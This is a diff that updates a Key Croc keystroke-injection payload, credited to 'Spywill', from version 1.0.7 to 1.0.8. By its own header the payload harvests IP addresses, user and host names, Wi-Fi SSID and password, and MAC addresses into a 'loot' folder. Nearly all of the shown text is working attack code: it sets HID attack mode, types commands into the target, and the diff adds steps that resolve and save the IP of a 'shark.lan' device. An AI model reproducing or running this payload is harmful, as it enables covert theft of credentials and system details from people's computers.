@@ -3,7 +3,7 @@
 #                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to loot folder
 # Author:        Spywill
-# Version:       1.0.7
+# Version:       1.0.8
 # Category:      Key Croc
 #
 #
@@ -14,7 +14,7 @@ PC_PW=LINUX           #<-----Edit LINUX-PC_PASSWD_HERE
 #
 CROC_OS=/root/udisk/loot/Croc_OS.txt
 cat > ${CROC_OS}
-rm -f /root/udisk/loot/Croc_OS_wind.txt /root/udisk/loot/Croc_OS_ip.txt
+rm -f /root/udisk/loot/Croc_OS_wind.txt /root/udisk/loot/Croc_OS_ip.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
 ATTACKMODE AUTO_ETHERNET
 LED ATTACK
 GET TARGET_OS
@@ -45,6 +45,9 @@ case $TARGET_OS in
            sleep 2
            Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
            Q ENTER
+           sleep 3
+           Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
+           Q ENTER
            sleep 3           
            ATTACKMODE HID
            sleep 1
@@ -58,8 +61,8 @@ case $TARGET_OS in
            echo "$TARGET_IP" >> ${CROC_OS}
            echo "$TARGET_HOSTNAME" >> ${CROC_OS}
            echo "$HOST_IP" >> ${CROC_OS}
-           $(sed -i 's/\r//g' /root/udisk/loot/Croc_OS_wind.txt)
-           $(sed -i '0,/./s/^.//' /root/udisk/loot/Croc_OS_wind.txt)
+           $(sed -i 's/\r//g' /root/udisk/loot/Croc_OS_wind.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+           $(sed -i '0,/./s/^.//' /root/udisk/loot/Croc_OS_wind.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
            Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       MACOS)
@@ -107,7 +110,6 @@ raspberrypi)
            Q ENTER
            sleep 1
            Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
-           Q ENTER
            Q ENTER
            sleep 2
            Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
@@ -157,6 +159,9 @@ raspberrypi)
            Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
            Q ENTER
            sleep 1
+           Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+           Q ENTER
+           sleep 2
            Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
            Q ENTER
            sleep 1
@@ -206,6 +211,9 @@ raspberrypi)
            Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
            Q ENTER
            sleep 1
+           Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+           Q ENTER
+           sleep 2
            Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
            Q ENTER
            sleep 1
